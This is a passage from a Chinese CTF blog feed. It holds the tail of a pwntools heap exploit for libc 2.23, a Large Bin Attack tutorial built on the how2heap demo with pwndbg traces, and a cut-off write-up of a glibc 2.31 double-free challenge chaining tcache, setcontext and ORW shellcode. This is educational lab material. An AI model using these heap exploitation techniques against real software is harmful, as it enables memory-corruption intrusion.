class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">offset</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> num<span class="token operator">*</span><span class="token number">2</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span> <span class="token number">0x4527a</span><span class="token punctuation">,</span> <span class="token number">0xf03a4</span><span class="token punctuation">,</span> <span class="token number">0xf1247</span><span class="token punctuation">]</span>arginfo <span class="token operator">=</span> <span class="token number">3954480</span> <span class="token comment"># __printf_arginfo_table</span>function <span class="token operator">=</span> <span class="token number">3970152</span> <span class="token comment"># __printf_function_table</span>main_arena <span class="token operator">=</span> <span class="token number">3951392</span>fast_max <span class="token operator">=</span> <span class="token number">3958776</span> <span class="token comment"># global_max_fast</span>size_1 <span class="token operator">=</span> offset<span class="token punctuation">(</span>arginfo <span class="token operator">-</span> main_arena<span class="token punctuation">)</span>size_2 <span class="token operator">=</span> offset<span class="token punctuation">(</span>function <span class="token operator">-</span> main_arena<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span> <span class="token comment">#0</span>add<span class="token punctuation">(</span>size_1<span class="token punctuation">,</span><span class="token string">"bbb"</span><span class="token punctuation">)</span> <span class="token comment">#1</span>add<span class="token punctuation">(</span>size_2<span class="token punctuation">,</span><span class="token string">"ccc"</span><span class="token punctuation">)</span> <span class="token comment">#2</span>delet<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">88</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc_base => "</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>fast_max<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token comment"># gdb.attach(p)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>delet<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>delet<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> house </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-LargeBinAttack</title>
      <link href="//post/pwn-LargeBinAttack.html"/>
      <url>//post/pwn-LargeBinAttack.html</url>
      
        <content type="html"><![CDATA[<h1 id="PWN-Large-Bin-Attack"><a href="#PWN-Large-Bin-Attack" class="headerlink" title="[PWN]Large Bin Attack"></a>[PWN]Large Bin Attack</h1><blockquote><p>平时做题很少遇到,但是一旦遇到就完全不会 (</p></blockquote><span id="more"></span><h2 id="Large-bin"><a href="#Large-bin" class="headerlink" title="Large bin"></a>Large bin</h2><p>large bin中一共包括63个bin，每个bin中的chunk大小不一致，而是出于一定区间范围内。此外这63个bin被分成了6组，每组bin中的chunk之间的公差一致.</p><p>被释放进Large Bin中的chunk，除了以前经常见到的prev_size、size、fd、bk之外，还具有fd_nextsize和bk_nextsize:</p><p>fd_nextsize，bk_nextsize：只有chunk可先的时候才使用，不过用于较大的chunk（large chunk）<br>fd_nextsize指向前一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针<br>bk_nextsize指向后一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针<br>一般空闲的large chunk在fd的遍历顺序中，按照由大到小的顺序排列。这样可以避免在寻找合适chunk时挨个遍历</p><p><strong>Largebin的插入</strong></p><p>在index相同的情况下：</p><p>1、按照大小，从大到小排序（小的链接large bin块）<br>2、如果大小相同，按照free的时间排序<br>3、多个大小相同的堆块，只有首堆块的fd_nextsize和bk_nextsize会指向其他堆块，后面的堆块的fd_nextsize和bk_nextsize均为0<br>4、size最大的chunk的bk_nextsize指向最小的chunk，size最小的chunk的fd_nextsize指向最大的chunk</p><h2 id="Large-bin-Attack"><a href="#Large-bin-Attack" class="headerlink" title="Large bin Attack"></a>Large bin Attack</h2><p>经典How2heap:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// gcc -g -no-pie pwn.c -o pwn</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> stack_var1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> stack_var2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"stack_var1 (%p): %ld\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var1<span class="token punctuation">,</span> stack_var1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"stack_var2 (%p): %ld\n\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var2<span class="token punctuation">,</span> stack_var2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x320</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span><span class="token operator">*</span> p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>    p2<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x3f1</span><span class="token punctuation">;</span>    p2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    p2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    p2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stack_var1 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    p2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stack_var2 <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"stack_var1 (%p): %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>stack_var1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"stack_var2 (%p): %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>stack_var2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先在第10行下断点,得到两个栈上参数:</p><pre class="line-numbers language-none"><code class="language-none">stack_var1 (0x7fffffffde18): 0stack_var2 (0x7fffffffde20): 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接下来在第16行下断点,得到6个chunk,其中malloc(0x20)的chunk都是为了防止chunk合并而申请的</p><pre class="line-numbers language-none"><code class="language-none">Allocated chunk | PREV_INUSE  &lt;-- p1Addr: 0x602000Size: 0x331Allocated chunk | PREV_INUSEAddr: 0x602330Size: 0x31Allocated chunk | PREV_INUSE  &lt;-- p2Addr: 0x602360Size: 0x411Allocated chunk | PREV_INUSEAddr: 0x602770Size: 0x31Allocated chunk | PREV_INUSE  &lt;-- p3Addr: 0x6027a0Size: 0x411Allocated chunk | PREV_INUSEAddr: 0x602bb0Size: 0x31<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后释放p1 ,在第17行下断点</p><pre class="line-numbers language-none"><code class="language-none">unsortedbinall: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000#      [p1]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>之后释放p2 ,在第18行下断点</p><pre class="line-numbers language-none"><code class="language-none">unsortedbinall: 0x602360 —▸ 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602360 &#x2F;* &#39;&#96;#&#96;&#39; *&#x2F;#      [p2]        [p1]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>由于 P1 的 size 为 0x330，P2 的 size 为 0x410，两个 chunk 的 size 均超过了 fast chunk 的最大值，所以在释放 P1、P2 的时候，两个 chunk 均进入 unsortbin 链表中。这里还可以细分，由于 P1 的 size 小于 0x3F0，所以<code>P1最终应该归属为small bin中</code>。P2 大于 0x3F0，所以<code>P2最终应该归属为large bin中</code></p><p>接下来执行切割,执行<code>void* p4 = malloc(0x90);</code>,在第19行下断点:</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">pwndbg&gt; binsunsortedbinall: 0x6020a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6020a0largebins0x400: 0x602360 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x602360 &#x2F;* &#39;&#96;#&#96;&#39; *&#x2F;pwndbg&gt; heapAllocated chunk | PREV_INUSE  &lt;----------p4Addr: 0x602000Size: 0xa1Free chunk (unsortedbin) | PREV_INUSE  &lt;--(p1-p4)Addr: 0x6020a0Size: 0x291fd: 0x7ffff7dd1b78bk: 0x7ffff7dd1b78Allocated chunkAddr: 0x602330Size: 0x30Free chunk (largebins) | PREV_INUSE  &lt;-----p2Addr: 0x602360Size: 0x411fd: 0x7ffff7dd1f68bk: 0x7ffff7dd1f68fd_nextsize: 0x602360bk_nextsize: 0x602360Allocated chunkAddr: 0x602770Size: 0x30Allocated chunk | PREV_INUSE  &lt;-------------p3Addr: 0x6027a0Size: 0x411Allocated chunk | PREV_INUSEAddr: 0x602bb0Size: 0x31Top chunk | PREV_INUSE  &lt;-------------top_chunkAddr: 0x602be0Size: 0x20421<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码执行了很多操作:</p><ul><li>从 unsorted bin 中拿出最后一个 chunk(P1)</li><li>把这个 chunk(P1) 放进 small bin 中，并标记这个 small bin 中有空闲的 chunk</li><li>从 unsorted bin 中拿出最后一个 chunk(P2)（P1 被拿走之后 P2 就作为最后一个 chunk 了）</li><li>把这个 chunk(P2) 放进 large bin 中，并标记这个 large bin 有空先的 chunk</li><li>现在 unsorted bin 中为空，从 small bin 中的 P1 中分割出一个小 chunk，满足请求的 P4</li><li>并把剩下的 chunk(0x330 - 0xa0=0x290)  放回 unsorted bin 中</li></ul><p>之后释放P3,在第20行下断点</p><pre class="line-numbers language-none"><code class="language-none">unsortedbinall: 0x6027a0 —▸ 0x6020a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6027a0smallbinsemptylargebins0x400: 0x602360 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x602360 &#x2F;* &#39;&#96;#&#96;&#39; *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于 P3 的 size 也是<code>大于0x3F0</code>的，所以首先会被挂进<code>unsorted bin</code>中进行过度</p><p>之后修改P2内容,在第25行下断点:</p><p>修改前:</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x6023600x602360:0x00000000000000000x00000000000004110x602370:0x00007ffff7dd1f680x00007ffff7dd1f680x602380:0x00000000006023600x0000000000602360<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>修改后:</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x6023600x602360:0x00000000000000000x00000000000003f10x602370:0x00000000000000000x00007fffffffde08(stack_var1-0x10)0x602380:0x00000000000000000x00007fffffffde00(stack_var2-0x20)largebins0x400 [corrupted]FD: 0x602360 ◂— 0x0BK: 0x602360 —▸ 0x7fffffffde08 ◂— 0x0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，有五处内容被修改：</p><ul><li>size 部分由原来的 0x411 修改成<code>0x3f1</code>(重点)</li><li>fd 部分置空（不超过一个地址位长度的数据都可以）</li><li>bk 由 0x7ffff7dd1f68 修改成了<code>stack_var1_addr - 0x10(0x7fffffffde08)</code></li><li>fd_nextsize 置空（不超过一个地址位长度的数据都可以）</li><li>bk_nextsize 修改成<code>stack_var2_addr - 0x20(0x7fffffffde00)</code></li></ul><p><img src="https://img-blog.csdnimg.cn/20210120161024708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjAyMjM3,size_16,color_FFFFFF,t_70"></p><p>这里需要注意的是一个 chunk 的 bk 指向的是它的后一个被释放 chunk 的头指针，bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块的头指针：</p><ul><li>也就是说当前 P2 的 bk 指向的是一个以<code>stack_var1_addr - 0x10</code>为头指针的 chunk，这里记做 fake_chunk1，那么就意味着<code>stack_var1_addr</code>是作为这个 fake_chunk1 的<code>fd</code>指针。那么此时<code>P2 --&gt; bk --&gt; fd</code>就是 stack_var1_addr</li><li>P2 的 fd_nextsize 指向的是一个以<code>stack_var2_addr</code>为头指针的 chunk，这里记做 fake_chunk2，那么就意味着<code>stack_var2_addr</code>是作为这个 fake_chunk2 的<code>fd_nextsize</code>指针。那么此时<code>P2 --&gt; bk_nextsize --&gt; fd_nextsize</code>就是 stack_var2_addr</li></ul><p>把P3挂进Largebin,在第26行下断点:</p><p>使程序执行malloc(0x90);完成申请 size 为 0xa0 的 chunk。这一步也很关键，与第一次分割 chunk 的过程一致，首先从 unsorted bin 中拿出最后一个 chunk(P1_left size = 0x290)，并放入 small bin 中标记该序列的 small bin 有空闲 chunk。再从 unsorted bin 中拿出最后一个 chunk(P3 size = 0x410)，P3 的 size 是大于0x3f0的，所以理所应当应该向large bin中挂.</p><p>查看修改结果:</p><pre class="line-numbers language-none"><code class="language-none">stack_var1 (0x7fffffffde18): 0x6027a0stack_var2 (0x7fffffffde20): 0x6027a0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以看到此时 stack_var1 和 stack_var2 中的值已经被修改成了 P3 的头指针<code>0x6027a0</code></p><h2 id="总结-large-bin-attack-的利用方法"><a href="#总结-large-bin-attack-的利用方法" class="headerlink" title="总结 large bin attack 的利用方法"></a>总结 large bin attack 的利用方法</h2><p>how2heap 中也说了，large bin attack 是未来更深入的利用。总结一下利用的条件：</p><ul><li>可以修改一个 large bin chunk 的 data</li><li>从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面</li><li>通过 large bin attack 可以辅助 Tcache Stash Unlink+ 攻击</li><li>可以修改 _IO_list_all 便于伪造 _IO_FILE 结构体进行 FSOP。</li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wp-PWNHUB公开赛girl</title>
      <link href="//post/wp-PWNHUB%E5%85%AC%E5%BC%80%E8%B5%9Bgirl.html"/>
      <url>//post/wp-PWNHUB%E5%85%AC%E5%BC%80%E8%B5%9Bgirl.html</url>
      
        <content type="html"><![CDATA[<h1 id="WP-PWNHub公开赛moregirlfriend"><a href="#WP-PWNHub公开赛moregirlfriend" class="headerlink" title="[WP]PWNHub公开赛moregirlfriend"></a>[WP]PWNHub公开赛moregirlfriend</h1><blockquote><p>Glibc 2.31 ORW绕过</p><p>还是太菜了Orz</p></blockquote><span id="more"></span><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>经典菜单题,libc-2.31</p><p>开了沙箱,禁用了execve</p><h3 id="IDApro反汇编分析"><a href="#IDApro反汇编分析" class="headerlink" title="IDApro反汇编分析"></a>IDApro反汇编分析</h3><p><img src="https://pic.imgdb.cn/item/617967d32ab3f51d912cdda3.jpg"></p><p><img src="https://pic.imgdb.cn/item/6179681c2ab3f51d912d3940.jpg"></p><p><img src="https://pic.imgdb.cn/item/6179683d2ab3f51d912d5cbb.jpg"></p><p><img src="C:\Users\sunjiajun\AppData\Roaming\Typora\typora-user-images\image-20211027225513673.png" alt="image-20211027225513673"></p><h4 id="getgirlfriend函数"><a href="#getgirlfriend函数" class="headerlink" title="getgirlfriend函数:"></a>getgirlfriend函数:</h4><p>申请数量范围0-15</p><p>size大小15-0x500</p><p>同时把idx最大的块设置一个GETGIRLFRIEND位=1</p><h4 id="breakup函数"><a href="#breakup函数" class="headerlink" title="breakup函数:"></a>breakup函数:</h4><p>引入CHUNK_PTR_LEAVE数组保存被选择breakup的块</p><p>GETGIRLFRIEND位=0</p><h4 id="saygoodbye函数"><a href="#saygoodbye函数" class="headerlink" title="saygoodbye函数:"></a>saygoodbye函数:</h4><p>释放所有CHUNK_PTR_LEAVE数组保存的块</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>free之后垃圾数据残留泄露libc;</p><p>.bss数组CHUNK_PTR[]和FREE_LIST[]数组中间的空间只有0x40字节,</p><p>而saygoodbye最多可以释放9个块,即可以重复释放chunk[0],既可以造成UAF利用.</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><h3 id="简要分析"><a href="#简要分析" class="headerlink" title="简要分析"></a>简要分析</h3><p>UAF构造TcacheAttack打<strong>_IO_2_1_stdin_</strong> , 覆盖_IO_write_ptr 为stdin+0xe0 (_IO_2_1_stdin_结构体之后,作为setcontext+61的rdx).</p><p>改vtable 到 **_IO_str_jumps **, 之后exit(0)时调用会触发malloc@plt来调用malloc_hook.</p><p>继续填充malloc_hook为setcontext+61,触发malloc之后就调用setcontext+61以_IO_write_ptr作为rdx调整相关寄存器.</p><p>之后调用mprotect修改区块权限,调用shellcode1(SYS_read)读入shellcode2(ORW)并执行.</p><p>IO_File调用链:</p><p><code>exit(0) ==&gt; __run_exit_handlers ==&gt; _IO_cleanup ==&gt; _IO_flush_all_lockp ==&gt; IO_file_overflow  ==&gt; malloc ==&gt; __molloc_hook ==&gt; setcontext+61 ==&gt; mprotect ==&gt; shellcode1(SYS_read) ==&gt; shellcode2(ORW)</code></p><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><h4 id="1-UAF"><a href="#1-UAF" class="headerlink" title="1. UAF"></a>1. UAF</h4><p>.bss段分析:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x450</span><span class="token punctuation">,</span><span class="token string">"0"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x450</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>FREE_LIST数组在0x0060-0x0098,共0x40字节,最多容纳到 FREE_LIST[7]</li><li>CHUNK_PTR数组在0x00a0-0x0118,共0x80字节,最多容纳到CHUNK_PTR[15]</li><li>从0x0120之后开始是SIZE[]数组</li></ul><p><img src="https://pic.imgdb.cn/item/617bc01f2ab3f51d910d5b58.png"></p><p>在breadup函数中,NUM参数最大为8,即<code>for(i=0 ; i &lt; NUM ; i++)</code>,在FREE_LIST中最多放入8个块地址,最大到FREE_LIST[7]</p><p>在saygoodbye中,NUM参数同样最大为8,即<code>for(i=0 ; i &lt;= NUM &amp;&amp; FREE_LIST[i]; i++)</code>,即醉倒运行释放到FREE_LIST[8]</p><p>而根据.bss段的排布来看FREE_LIST[8] == CHUNK_PTR[0] </p><p>导致如果在FREE_LIST靠前的位置放入CHUNK_PTR[0]的地址,同时参数NUM设置为8,就会释放两次CHUNK_PTR[0],造成doublefree</p><p>而doublefree会导致UAF漏洞.</p><h4 id="2-leak-libc"><a href="#2-leak-libc" class="headerlink" title="2.leak libc"></a>2.leak libc</h4><p>leak libc利用这里释放chunk但是没有清空垃圾数据(主要是bk)的遗漏,申请并释放unsortedbin</p><p><img src="https://pic.imgdb.cn/item/617bc01f2ab3f51d910d5b61.png"></p><p>利用先打印再释放的先后顺序,就可以泄露libc地址</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x450</span><span class="token punctuation">,</span><span class="token string">"0"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x450</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token comment"># leave top chunk</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x450</span><span class="token punctuation">,</span><span class="token string">"0"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># leak libc (unsortedbin bk)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token number">96</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc_base ==> "</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token 